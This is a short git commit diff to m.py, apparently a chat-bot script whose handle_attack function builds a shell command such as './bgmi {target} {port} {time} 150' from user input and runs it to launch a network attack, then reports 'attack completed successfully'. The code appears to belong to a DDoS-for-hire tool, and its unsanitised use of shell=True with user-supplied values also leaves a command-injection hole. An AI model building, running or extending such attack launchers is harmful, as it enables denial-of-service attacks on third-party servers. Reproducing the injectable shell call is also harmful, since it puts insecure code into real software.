5b02c18b115d94891f19a9608b74842df32020df
Deltapg001 <lassipiloop@proton.me>
2025-03-10 10:23:11 +0530

    Update m.py

--- m.py
+++ m.py
@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./rs {target} {port} {time} 200"
+                    full_command = f"./bgmi {target} {port} {time} 150"
                     subprocess.run(full_command, shell=True)
 
                     response = "attack completed successfully feedback doo."
